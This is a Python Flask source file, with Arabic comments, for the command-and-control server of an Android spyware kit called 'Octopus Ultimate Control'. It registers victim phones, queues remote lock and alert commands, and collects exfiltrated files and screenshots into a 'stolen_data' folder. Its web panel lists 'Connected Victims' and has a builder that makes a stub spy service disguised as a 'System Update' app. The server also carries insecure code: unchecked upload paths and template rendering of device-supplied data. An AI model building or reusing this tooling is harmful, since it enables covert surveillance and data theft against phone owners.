import os
import json
import sqlite3
import base64
import time
import threading
import logging
import uuid
import shutil
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, send_file, render_template_string
from flask_cors import CORS
from flask_socketio import SocketIO, emit
from cryptography.fernet import Fernet
import io

# ==========================================
# إعدادات النظام المتقدمة
# ==========================================
APP_NAME = "Octopus Ultimate Control v8.0"
VERSION = "8.0.0"
AUTHOR = "Octopus Dev"

# إعدادات المجلدات والملفات
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "octopus_core.db")
LOGS_DIR = os.path.join(BASE_DIR, "system_logs")
UPLOADS_DIR = os.path.join(BASE_DIR, "stolen_data")
APK_DIR = os.path.join(BASE_DIR, "payloads")

# إنشاء المجلدات الضرورية
for directory in [LOGS_DIR, UPLOADS_DIR, APK_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory)

# إعدادات التشفير والأمان
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

# إعدادات السيرفر
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500MB Upload Limit
CORS(app, resources={r"/*": {"origins": "*"}})
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# إعداد التسجيل (Logging)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(LOGS_DIR, "server.log")),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ==========================================
# إدارة قاعدة البيانات (SQLite)
# ==========================================
class DatabaseManager:
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_db()

    def get_connection(self):
        return sqlite3.connect(self.db_path)

    def init_db(self):
        """تهيئة جداول قاعدة البيانات"""
        conn = self.get_connection()
        cursor = conn.cursor()

        # جدول الأجهزة (الضحايا)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                id TEXT PRIMARY KEY,
                persistent_id TEXT UNIQUE,
                model TEXT,
                android_version TEXT,
                ip_address TEXT,
                mac_address TEXT,
                battery_level INTEGER,
                is_rooted INTEGER DEFAULT 0,
                network_type TEXT,
                location_lat REAL,
                location_lon REAL,
                last_seen TIMESTAMP,
                status TEXT DEFAULT 'offline',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # جدول الأوامر
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                type TEXT,
                payload TEXT,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (id)
            )
        ''')

        # جدول الملفات المسروقة
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                filename TEXT,
                file_type TEXT,
                file_size INTEGER,
                file_path TEXT,
                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (device_id) REFERENCES devices (id)
            )
        ''')

        conn.commit()
        conn.close()
        logger.info("Database initialized successfully.")

    # --- عمليات الأجهزة ---
    def register_device(self, data, ip):
        conn = self.get_connection()
        cursor = conn.cursor()
        now = datetime.now().isoformat()
        
        device_id = data.get('device_id')
        if not device_id: return None

        try:
            cursor.execute('''
                INSERT INTO devices (id, persistent_id, model, android_version, ip_address, 
                                   battery_level, network_type, last_seen, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'online')
                ON CONFLICT(id) DO UPDATE SET
                    model=excluded.model,
                    ip_address=excluded.ip_address,
                    battery_level=excluded.battery_level,
                    last_seen=excluded.last_seen,
                    status='online'
            ''', (
                device_id,
                data.get('persistent_id', device_id),
                data.get('model', 'Unknown'),
                data.get('version', 'Unknown'),
                ip,
                data.get('battery', 0),
                data.get('network', 'Unknown'),
                now
            ))
            conn.commit()
            return True
        except Exception as e:
            logger.error(f"Error registering device: {e}")
            return False
        finally:
            conn.close()

    def update_heartbeat(self, device_id):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("UPDATE devices SET last_seen = ?, status = 'online' WHERE id = ?", 
                          (datetime.now().isoformat(), device_id))
            conn.commit()
        except Exception as e:
            logger.error(f"Heartbeat error: {e}")
        finally:
            conn.close()

    def get_all_devices(self):
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM devices ORDER BY last_seen DESC")
        devices = [dict(row) for row in cursor.fetchall()]
        conn.close()
        return devices

    # --- عمليات الأوامر ---
    def add_command(self, device_id, cmd_type, payload):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("INSERT INTO commands (device_id, type, payload) VALUES (?, ?, ?)",
                          (device_id, cmd_type, json.dumps(payload)))
            conn.commit()
            return cursor.lastrowid
        finally:
            conn.close()

    def get_pending_commands(self, device_id):
        conn = self.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT id, type, payload FROM commands WHERE device_id = ? AND status = 'pending'", (device_id,))
            cmds = []
            for row in cursor.fetchall():
                cmds.append({
                    "id": row[0],
                    "type": row[1],
                    "data": json.loads(row[2]) if row[2] else {}
                })
                # تحديث الحالة إلى "تم الاستلام"
                cursor.execute("UPDATE commands SET status = 'sent' WHERE id = ?", (row[0],))
            conn.commit()
            return cmds
        finally:
            conn.close()

    # --- عمليات الملفات ---
    def save_file_record(self, device_id, filename, file_type, size, path):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO files (device_id, filename, file_type, file_size, file_path) VALUES (?, ?, ?, ?, ?)",
                      (device_id, filename, file_type, size, path))
        conn.commit()
        conn.close()

    def get_device_files(self, device_id):
        conn = self.get_connection()
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM files WHERE device_id = ? ORDER BY uploaded_at DESC", (device_id,))
        files = [dict(row) for row in cursor.fetchall()]
        conn.close()
        return files

db = DatabaseManager(DB_PATH)

# ==========================================
# خدمات الخلفية (Background Services)
# ==========================================
def cleanup_service():
    """خدمة تنظيف الأجهزة غير النشطة"""
    while True:
        try:
            conn = db.get_connection()
            cursor = conn.cursor()
            # تعيين حالة الأجهزة القديمة إلى offline
            cutoff = datetime.now() - timedelta(minutes=5)
            cursor.execute("UPDATE devices SET status = 'offline' WHERE last_seen < ?", (cutoff.isoformat(),))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
        time.sleep(60)

threading.Thread(target=cleanup_service, daemon=True).start()

# ==========================================
# أدوات بناء APK (Payload Builder)
# ==========================================
def generate_malicious_apk(device_id, app_name, package_name, server_url):
    """محاكاة إنشاء تطبيق أندرويد خبيث"""
    project_dir = os.path.join(APK_DIR, app_name)
    if os.path.exists(project_dir):
        shutil.rmtree(project_dir)
    os.makedirs(project_dir, exist_ok=True)
    
    # محاكاة كود Java للحقن
    java_code = f"""
    package {package_name};
    // Android Spy Service
    // Server: {server_url}
    // Target Device: {device_id}
    
    public class SpyService extends Service {{
        private static final String SERVER_URL = "{server_url}";
        // ... (كود التجسس الكامل هنا)
    }}
    """
    
    with open(os.path.join(project_dir, "SpyService.java"), "w") as f:
        f.write(java_code)
        
    return java_code  # إرجاع الكود للعرض

# ==========================================
# واجهة برمجة التطبيقات (API Endpoints)
# ==========================================

@app.route('/api/connect', methods=['POST'])
def api_connect():
    """نقطة اتصال أولية للجهاز"""
    data = request.json
    ip = request.remote_addr
    if db.register_device(data, ip):
        socketio.emit('device_connected', {'id': data.get('device_id'), 'model': data.get('model')})
        return jsonify({"status": "success", "message": "Connected"})
    return jsonify({"status": "error"}), 500

@app.route('/api/heartbeat', methods=['POST'])
def api_heartbeat():
    """استلام نبضات القلب"""
    data = request.json
    device_id = data.get('device_id')
    if device_id:
        db.update_heartbeat(device_id)
        # التحقق من وجود أوامر
        cmds = db.get_pending_commands(device_id)
        return jsonify({"status": "ok", "commands": cmds})
    return jsonify({"status": "error"}), 400

@app.route('/api/upload', methods=['POST'])
def api_upload():
    """استلام الملفات والصور"""
    try:
        device_id = request.form.get('device_id')
        file_type = request.form.get('type', 'file')
        
        if 'file' in request.files:
            file = request.files['file']
            filename = f"{device_id}_{int(time.time())}_{file.filename}"
            path = os.path.join(UPLOADS_DIR, filename)
            file.save(path)
            
            db.save_file_record(device_id, file.filename, file_type, os.path.getsize(path), path)
            socketio.emit('new_file', {'device_id': device_id, 'filename': filename})
            return jsonify({"status": "success"})
            
        elif 'data' in request.json: # Base64 Image
            data = request.json['data']
            if "," in data: data = data.split(",")[1]
            img_data = base64.b64decode(data)
            filename = f"screenshot_{device_id}_{int(time.time())}.jpg"
            path = os.path.join(UPLOADS_DIR, filename)
            with open(path, "wb") as f:
                f.write(img_data)
            
            db.save_file_record(device_id, filename, "screenshot", len(img_data), path)
            socketio.emit('new_screenshot', {'device_id': device_id, 'url': f'/uploads/{filename}'})
            return jsonify({"status": "success"})

    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/command', methods=['POST'])
def api_send_command():
    """إرسال أمر من لوحة التحكم"""
    data = request.json
    device_id = data.get('device_id')
    cmd_type = data.get('type')
    payload = data.get('payload', {})
    
    if db.add_command(device_id, cmd_type, payload):
        return jsonify({"status": "queued"})
    return jsonify({"status": "error"}), 500

@app.route('/api/generate_apk', methods=['POST'])
def api_generate_apk():
    """إنشاء APK خبيث"""
    data = request.json
    code = generate_malicious_apk(
        data.get('device_id'), 
        data.get('app_name'), 
        data.get('package_name'), 
        request.host_url
    )
    return jsonify({"status": "success", "code": code})

# ==========================================
# واجهة الويب (Control Panel UI)
# ==========================================

@app.route('/control')
def control_panel():
    devices = db.get_all_devices()
    
    # إحصائيات سريعة
    total = len(devices)
    online = len([d for d in devices if d['status'] == 'online'])
    
    device_rows = ""
    for d in devices:
        status_color = "success" if d['status'] == 'online' else "danger"
        last_seen = datetime.fromisoformat(d['last_seen']).strftime('%H:%M:%S') if d['last_seen'] else "N/A"
        
        device_rows += f"""
        <tr id="row-{d['id']}" class="align-middle">
            <td><span class="badge bg-dark font-monospace">{d['id'][:8]}...</span></td>
            <td>{d['model']}</td>
            <td>Android {d['android_version']}</td>
            <td><span class="badge bg-{status_color}">{d['status'].upper()}</span></td>
            <td>{d['battery_level']}%</td>
            <td>{last_seen}</td>
            <td>
                <div class="btn-group btn-group-sm">
                    <button class="btn btn-outline-info" onclick="selectDevice('{d['id']}')">Manage</button>
                    <button class="btn btn-outline-warning" onclick="quickCommand('{d['id']}', 'alert')">Alert</button>
                    <button class="btn btn-outline-danger" onclick="quickCommand('{d['id']}', 'lock')">Lock</button>
                </div>
            </td>
        </tr>
        """

    html = f"""
    <!DOCTYPE html>
    <html lang="en" data-bs-theme="dark">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Octopus Ultimate v8</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            body {{ background-color: #0f172a; font-family: 'Segoe UI', system-ui; }}
            .sidebar {{ height: 100vh; background: #1e293b; border-right: 1px solid #334155; }}
            .main-content {{ height: 100vh; overflow-y: auto; }}
            .card {{ background: #1e293b; border: 1px solid #334155; }}
            .table {{ --bs-table-bg: transparent; }}
            .btn-action {{ width: 100%; text-align: left; margin-bottom: 5px; }}
        </style>
    </head>
    <body>
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-2 sidebar p-3">
                    <h3 class="text-success mb-4"><i class="fas fa-spider"></i> OCTOPUS</h3>
                    <div class="d-grid gap-2">
                        <button class="btn btn-primary" onclick="showTab('dashboard')"><i class="fas fa-tachometer-alt"></i> Dashboard</button>
                        <button class="btn btn-outline-light" onclick="showTab('files')"><i class="fas fa-folder"></i> Files</button>
                        <button class="btn btn-outline-light" onclick="showTab('builder')"><i class="fas fa-hammer"></i> Builder</button>
                    </div>
                    
                    <div class="mt-auto pt-5">
                        <div class="card bg-dark">
                            <div class="card-body">
                                <small class="text-muted">Server Status</small>
                                <div class="d-flex align-items-center">
                                    <div class="spinner-grow spinner-grow-sm text-success me-2"></div>
                                    <span>Online</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-md-10 main-content p-4">
                    <div id="dashboard" class="tab-content">
                        <div class="row mb-4">
                            <div class="col-md-3">
                                <div class="card"><div class="card-body text-center">
                                    <h3>{total}</h3><small>Total Devices</small>
                                </div></div>
                            </div>
                            <div class="col-md-3">
                                <div class="card"><div class="card-body text-center">
                                    <h3 class="text-success">{online}</h3><small>Online Now</small>
                                </div></div>
                            </div>
                        </div>

                        <div class="card">
                            <div class="card-header d-flex justify-content-between">
                                <h5 class="mb-0">Connected Victims</h5>
                                <button class="btn btn-sm btn-light" onclick="location.reload()"><i class="fas fa-sync"></i></button>
                            </div>
                            <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead>
                                        <tr>
                                            <th>ID</th>
                                            <th>Model</th>
                                            <th>OS</th>
                                            <th>Status</th>
                                            <th>Battery</th>
                                            <th>Last Seen</th>
                                            <th>Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {device_rows}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                    
                    <div id="builder" class="tab-content d-none">
                        <div class="card">
                            <div class="card-header"><h5>APK / HTML Payload Builder</h5></div>
                            <div class="card-body">
                                <div class="mb-3">
                                    <label>Payload Type</label>
                                    <select class="form-select bg-dark text-light">
                                        <option>HTML Stealth Binder</option>
                                        <option>Android APK (Stub)</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label>LHOST (Server URL)</label>
                                    <input type="text" class="form-control bg-dark text-light" id="serverUrl" value="{request.host_url}">
                                </div>
                                <div class="mb-3">
                                    <label>Device ID (Optional)</label>
                                    <input type="text" class="form-control bg-dark text-light" id="deviceId" placeholder="Target Device ID">
                                </div>
                                <button class="btn btn-danger w-100" onclick="generatePayload()">
                                    <i class="fas fa-radiation"></i> Generate Payload
                                </button>
                                <div id="payloadOutput" class="mt-3"></div>
                            </div>
                        </div>
                    </div>

                    <div id="files" class="tab-content d-none">
                        <div class="card">
                            <div class="card-header"><h5>Stolen Files</h5></div>
                            <div class="card-body text-center text-muted">
                                <i class="fas fa-folder-open fa-3x mb-3"></i>
                                <p>Select a device to view files.</p>
                            </div>
                        </div>
                    </div>

                </div>
            </div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
        <script>
            const socket = io();
            
            socket.on('device_connected', (data) => {{
                const toast = document.createElement('div');
                toast.className = 'toast show position-fixed bottom-0 end-0 m-3';
                toast.innerHTML = `<div class="toast-header"><strong class="me-auto">New Victim!</strong></div><div class="toast-body">${{data.model}} connected.</div>`;
                document.body.appendChild(toast);
                setTimeout(() => toast.remove(), 3000);
            }});

            function showTab(id) {{
                document.querySelectorAll('.tab-content').forEach(el => el.classList.add('d-none'));
                document.getElementById(id).classList.remove('d-none');
            }}

            function quickCommand(id, type) {{
                let payload = {{}};
                if(type === 'alert') {{
                    const msg = prompt("Enter message:");
                    if(!msg) return;
                    payload = {{message: msg}};
                }}
                
                fetch('/api/command', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{device_id: id, type: type, payload: payload}})
                }}).then(r => r.json()).then(d => alert(d.status));
            }}
            
            function selectDevice(id) {{
                alert("Opening control panel for: " + id);
            }}

            function generatePayload() {{
                const did = document.getElementById('deviceId').value || 'generic';
                const url = document.getElementById('serverUrl').value;
                
                fetch('/api/generate_apk', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        device_id: did,
                        app_name: 'System Update',
                        package_name: 'com.android.sys.upd'
                    }})
                }})
                .then(r => r.json())
                .then(d => {{
                    document.getElementById('payloadOutput').innerHTML = `<pre class="bg-black p-3 text-success">${{d.code}}</pre>`;
                }});
            }}
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/uploads/<path:filename>')
def download_file(filename):
    return send_file(os.path.join(UPLOADS_DIR, filename))

# ==========================================
# تشغيل السيرفر
# ==========================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port, allow_unsafe_werkzeug=True)
